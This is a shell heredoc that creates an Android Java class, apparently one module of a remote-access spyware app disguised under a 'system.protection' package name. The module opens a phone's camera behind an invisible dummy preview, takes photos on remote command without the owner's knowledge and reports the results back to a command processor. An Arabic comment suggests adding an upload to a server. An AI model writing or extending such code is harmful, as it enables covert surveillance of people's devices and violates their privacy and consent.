cat > app/src/main/java/com/android/system/protection/commands/CameraCapture.java << 'EOF
package com.android.system.protection.commands;

import android.content.Context;
import android.hardware.Camera;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class CameraCapture {

    private static Camera camera;
    private static int cameraId;

    public static void capture(Context context, JSONObject params, String commandId) {
        try {
            int cameraFacing = params.optInt("camera", 0);
            int numberOfPhotos = params.optInt("count", 1);
            int delayMs = params.optInt("delay", 1000);

            cameraId = getCameraId(cameraFacing);
            if (cameraId == -1) {
                sendError(context, commandId, "Camera not available");
                return;
            }

            camera = Camera.open(cameraId);
            Camera.Parameters parameters = camera.getParameters();

            SurfaceView dummyView = new SurfaceView(context);
            SurfaceHolder holder = dummyView.getHolder();
            camera.setPreviewDisplay(holder);
            camera.startPreview();

            for (int i = 0; i < numberOfPhotos; i++) {
                Thread.sleep(delayMs);
                camera.takePicture(null, null, (data, cam) -> {
                    File photoFile = new File(context.getExternalFilesDir(null), "photo_" + System.currentTimeMillis() + ".jpg");
                    try (FileOutputStream fos = new FileOutputStream(photoFile)) {
                        fos.write(data);
                        JSONObject result = new JSONObject();
                        result.put("file_path", photoFile.getAbsolutePath());
                        // يمكنك إضافة رفع الملف إلى السيرفر هنا
                        CommandProcessor.sendResult(context, commandId, result);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                });
            }

            camera.stopPreview();
            camera.release();
            camera = null;

        } catch (Exception e) {
            Log.e("CameraCapture", "Error", e);
            sendError(context, commandId, e.getMessage());
        }
    }

    private static int getCameraId(int facing) {
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == facing) {
                return i;
            }
        }
        return -1;
    }

    private static void sendError(Context context, String commandId, String error) {
        JSONObject result = new JSONObject();
        try {
            result.put("error", error);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}
EOF